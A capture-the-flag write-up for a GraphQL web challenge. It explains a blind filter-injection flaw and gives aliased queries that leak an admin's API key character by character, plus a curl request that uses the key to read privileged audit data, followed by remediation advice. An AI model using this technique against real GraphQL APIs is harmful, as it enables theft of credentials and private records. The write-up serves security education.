# Internal Affairs

**Points:** 498  
**Category:** Web Exploitation / GraphQL  
**Target:** `https://internal-affairs.cruxipher.crux-bphc.com`

## Flag

```text
cruXipher{the_rats_read_the_audit_logs}
```

## Challenge

The **Crooxus Dynamics Employee Portal** is a React single-page application with five tabs showing employee directory, departments, service accounts, compensation data, and audit logs. A suspicious salary spike on February 18, 2026 needs investigation.

## Reconnaissance & Schema Introspection

GraphQL introspection is enabled on `/graphql`. The schema reveals a custom field description on `Query.auditEvents`:

```graphql
type Query {
  auditEvents(limit: Int): [AuditEvent!]!
  "Send X-API-Key for full access."
}
```

The `AuditEvent` type includes sensitive fields that require administrator access:

```graphql
type AuditEvent {
  previousSalary: Int
  newSalary: Int
  comment: String
  actor: User
  targetUser: User
}
```

## Vulnerability: Blind GraphQL Filter Injection

While the **output resolver** on `User.apiKey` enforces a `FORBIDDEN` check, the **input filter** `Query.users(filter: UserFilter)` applies filtering **before** field-level authorization runs.

Testing:

```graphql
{
  users(filter: {
    username: { equals: "viktor.sloane" }
    apiKey: { startsWith: "c" }
  }) {
    id
  }
}
```

Returns `[{"id": "CD-1001"}]` when the prefix matches and `[]` when it does not.

Using GraphQL **field aliases**, the entire character set can be tested in a **single HTTP request per character position**.

## Exploitation

### Step 1: Exfiltrate Administrator's API Key

Targeting `viktor.sloane` (`CD-1001`, `role: ADMIN`), each round sends one aliased GraphQL query testing every candidate next character:

```graphql
{
  done: users(filter: { username: { equals: "viktor.sloane" }, apiKey: { equals: "crooxus_" } }) { id }
  c0:   users(filter: { username: { equals: "viktor.sloane" }, apiKey: { startsWith: "crooxus_a" } }) { id }
  c1:   users(filter: { username: { equals: "viktor.sloane" }, apiKey: { startsWith: "crooxus_b" } }) { id }
  ...
}
```

This leaks the full API key:

```text
crooxus_live_16dda46bb980a0de
```

### Step 2: Query Privileged Audit Events

Send `auditEvents` query with the recovered API key:

```bash
curl -s https://internal-affairs.cruxipher.crux-bphc.com/graphql \
  -H "Content-Type: application/json" \
  -H "X-API-Key: crooxus_live_16dda46bb980a0de" \
  -d '{
    "query": "{ auditEvents(limit: 100) { id timestamp action previousSalary newSalary comment actor { username } targetUser { username } } }"
  }'
```

Event **`AUD-2431`** reveals the culprit:

```json
{
  "id": "AUD-2431",
  "timestamp": "2026-02-18T16:42:09.000Z",
  "action": "COMPENSATION_UPDATED",
  "previousSalary": 105125,
  "newSalary": 42000000,
  "comment": "cruXipher{the_rats_read_the_audit_logs}",
  "actor": {
    "username": "theo.james"
  }
}
```

Systems Administrator **theo.james** raised his own salary from $105,125 to $42,000,000.

## Solution

See the full exploit script (`solve_internal_affairs.py`) in the repository.

### Usage

```bash
python3 solve.py
```

### Output

```text
[*] Targeting admin user: viktor.sloane (CD-1001)
[+] Leaking apiKey: crooxus_live_16dda46bb980a0de
[+] Recovered X-API-Key: crooxus_live_16dda46bb980a0de
[+] Flag: cruXipher{the_rats_read_the_audit_logs}
```

## Remediation

1. **Never expose secret attributes in filter inputs** - Sensitive columns must be excluded from GraphQL filter input types
2. **Disable introspection in production** unless the API is intentionally public
3. **Enforce separation of duties** on privileged actions
